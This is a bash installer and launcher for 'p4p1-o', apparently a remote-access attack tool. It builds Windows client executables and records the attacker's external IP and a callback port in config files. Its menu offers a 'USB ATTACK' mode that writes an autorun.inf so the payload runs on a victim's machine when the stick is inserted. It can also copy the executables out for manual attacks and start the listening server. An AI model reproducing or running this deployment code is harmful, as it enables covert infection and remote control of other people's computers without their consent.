#!/bin/bash
# *
# *       _ _       _
# *  _ __| | | _ __/ |
# * | '_ \_  _| '_ \ |
# * | .__/ |_|| .__/_|
# * |_|       |_|
# ***********************
#
# this file is an installation program
# and setup all cfg files.
# User guide to use p4p1-o
# ./p4p1-o_UserGuide

function Remove {
	REMOVED_ALL=0
	VER=`cat ~/.p4p1-o/cfg/ver.cfg`

	zip -r p4p1-b_V$VER.zip ~/.p4p1-o/
	mv p4p1-b_V$VER.zip backups/

	rm -rf ~/.p4p1-o/
	exit $REMOVED_ALL
}

E_NOINSTALL=40
E_EXEMISS=41
E_NOCHOICE=42
E_MAKE=43
E_NOCOMP=44
HOME_PATH=~/.p4p1-o/
CONF_PATH=~/.p4p1-o/cfg/
EXE_PATH=~/.p4p1-o/exe/
DESKTOP_PATH=~/Desktop
UN_FILE=~/.p4p1-o/cfg/un.cfg
PORT_FILE=~/.p4p1-o/cfg/port.cfg
IP_FILE=~/.p4p1-o/cfg/ip.cfg
VER_FILE=~/.p4p1-o/cfg/ver.cfg
AUTORUN=autorun.inf
MAKENAMEW32C=p4p1-o_32_Vx.exe
MAKENAMEW64C=p4p1-o_64_Vx.exe
MAKENAMELC=p4p1-o_Vx
MAKENAMELS=p4p1-s_Vx
EXT_IP=`dig +short myip.opendns.com @resolver1.opendns.com`


echo "*       _ _       _"
echo "*  _ __| | | _ __/ |"
echo "* | '_ \\_  _| '_\\  |"
echo "* | .__/ |_|| .__/_|"
echo "* |_|       |_|"
echo "*********welcome*********"

if [ "$1" = "-h" ]; then

	if [ ! -d "$HOME_PATH" ]; then

		echo "[?] Usage:"
		echo "           ./$0  -> basic installation"
		echo "           ./$0 -d -> cleanup after compile error"
		echo "[?] If the error code is $E_EXEMISS please insure that"
		echo "[?] You have a p4p1-o exe with the version specified"
		echo "[?] Or mingw. If you installend mingw do the cleanup and"
		echo "[?] Redo the basic installation"
		echo "[?] Note: you need 32 and 64 bit mingw to remove the error"
		echo "[?]       Or a 32 and 64 bit version of the program and use"
		echo "[?]       the specific version."

	else

		echo "[?]Usage:"
		echo "         ./$0  ->only mode available for now"
		echo "         ./$0 mrproper -> move the exes to version."
		echo "         p4p1-s -> command line server tool"

	fi

elif [ "$1" = "-d" ];then

	echo "[1] Creating a zip backup in the local dir"
	echo "[!] And removing all files"
	Remove

elif [ ! -d "$HOME_PATH" ]; then

	if [ ! -e "Makefile" ]; then
		echo "[!] Error no makefile found!"
		exit $E_MAKE
	fi

	echo "[*] Please enter  p4p1 version"
	read VERSION
	echo "[*] Making p4p1 version $VERSION for windows"
	make windows

	if [ "$?" = "2" ]; then
		echo "[!] Please download mingw"
		echo "[*] The program will compile the linux client and server version $VERSION"
		echo "[*] Press enter to continue"
		read
		make linux

		mv -v $MAKENAMELC p4p1-o_V$VERSION
		mv -v $MAKENAMELS p4p1-s_V$VERSION
	else
		mv -v $MAKENAMEW32C p4p1-o_32_V$VERSION.exe
		mv -v $MAKENAMEW64C p4p1-o_64_V$VERSION.exe
		echo "[*] Making p4p1 version $VERSION for linux"
		make linux

		mv -v $MAKENAMELC p4p1-o_V$VERSION
		mv -v $MAKENAMELS p4p1-s_V$VERSION
	fi

	echo "[*] Compiled all of the p4p1-o and p4p1-s files."

	if [ ! -e "p4p1-s_V$VERSION" ]; then
		echo "[!] Error during compile of server"
		echo "[!] Send a message at k0oo@icloud.com for trouble shooting"
		echo "[!] Or update this program."
		exit $E_NOCOMP
	fi

	echo "[*] First execution do you want to install all of the files for the server? (yes/no)"
	read q

	if [ "$q" = "no" ]; then
		rm -rf ~/.p4p1-o/
		exit E_NOINSTALL
	fi

	echo "[*] Create paths"
	mkdir -v $HOME_PATH
	mkdir -v $CONF_PATH
	mkdir -v $EXE_PATH

	echo "[*] Saving Version.."
	echo $VERSION > $VER_FILE

	echo "[*] Hello new user please enter youre name:"
	read name
	echo $name > $UN_FILE

	W32EXE=p4p1-o_32_V$VERSION.exe
	W64EXE=p4p1-o_64_V$VERSION.exe

	if [[ ! -e "$W32EXE" && ! -e "$W64EXE" ]]; then

		echo "[!] missing executables"
		echo "[!] To reinstall exes go to the download page or install mingw."
		echo "[!] And restart this app with -d"
		echo "[!] See Usage with -h for more information"
		echo -e "\e[31m[!] Error code: $E_EXEMISS\e[0m"

	else

		echo "[*] Copy exe into $EXE_PATH"
		mv -v $W32EXE $EXE_PATH
		mv -v $W64EXE $EXE_PATH

	fi

	echo "[*] Enter port for p4p1 (We recomend to use the default one 4441)"
	read port
	echo $port > $PORT_FILE

	echo "[*] Do you want to use your external ip: $EXT_IP (yes/no)"
	read q

	if [ "$q"  = "no" ]; then
		echo "[*] Enter custom ip"
		read CUSTOM_IP
		echo $CUSTOM_IP > $IP_FILE
	else
		echo "[*] Writing ip to file"
		echo $EXT_IP > $IP_FILE
	fi

	mv p4p1-s_V$VERSION $HOME_PATH

	echo "[*] Do you want the command line tool?? (yes / no)"
	echo "[*] Need root password for install"
	read q

	if [ "$q" = "yes" ]; then

		cd $HOME_PATH
		sudo ln -s p4p1-s_V$VERSION /usr/sbin/p4p1-s
		echo "[*] Installed commadn line tool"

	fi

	echo "[*] Installation finished thank you for using :)"

else

	if [ "$1" = "mrproper" ]; then

		echo "[*] Cleaning all of the p4p1 versions"
		mv -v p4p1-o_V* version/
		mv -v p4p1-s_V* version/
		echo "[*] Done."

	else
		UN=`cat ~/.p4p1-o/cfg/un.cfg`

		echo "[*] Hy $UN."
		echo "[*] Welcome to p4p1-o, This program was made by p4p1."
		echo "[*] You have 3 modes please choose which one you want to use."
		echo "[1] USB ATTACK"
		echo "[2] I WILL FIGURE MY ATTACK MYSELF JUST CP THE EXE TO THE DESKTOP"
		echo "[3] EXECUTE SERVER"
		read q

		if [ "$q" = "1" ]; then

			VERSIORET=`cat $VER_FILE`
			W32EXE_PATH="~/.p4p1-o/exe/p4p1-o_32_V$VERSIORET.exe"
			W64EXE_PATH="~/.p4p1-o/exe/p4p1-o_64_V$VERSIORET.exe"
			W32EXE=p4p1-o_32_V$VERSIORET.exe
			W64EXE=p4p1-o_64_V$VERSIORET.exe

			echo "[*] Please enter the usb path"
			read USB_PATH
			echo "[*] is it a 32 bit or 64 bit?"
			read q

			cd $USB_PATH
			echo "[autorun]" > $AUTORUN

			if [ "$q" = "32" ];then
				cp -v $W32EXE_PATH .
				echo "open=$W32EXE" >> $AUTORUN
			else
				cp -v $W64EXE_PATH .
				echo "open=$W64EXE" >> $AUTORUN
			fi

			echo "action=Start ShellRun-CD" >> $AUTORUN
			echo "[*] Created autorun"
			echo "[*] Copied to file with exe and done!"

		elif [ "$q" = "2" ]; then

			VERSIORET=`cat $VER_FILE`
			W32EXE_PATH="~/.p4p1-o/exe/p4p1-o_32_V$VERSIORET.exe"
			W64EXE_PATH="~/.p4p1-o/exe/p4p1-o_64_V$VERSIORET.exe"
			W32EXE=p4p1-o_32_V$VERSIORET.exe
			W64EXE=p4p1-o_64_V$VERSIORET.exe

			echo "[*] Retrieving files ..."
			cd $EXE_PATH
			cp -v $W32EXE $DESKTOP_PATH
			cp -v $W64EXE $DESKTOP_PATH

		elif [ "$q" = "3" ]; then

			VERSIORET=`cat $VER_FILE`

			echo "[*] Running Server..."
			cd ~/.p4p1-o/
			./p4p1-s_V$VERSIORET
			cd ~

		else

			echo "[!] Wrong choice"
			exit $E_NOCHOICE

		fi
	fi
fi
exit
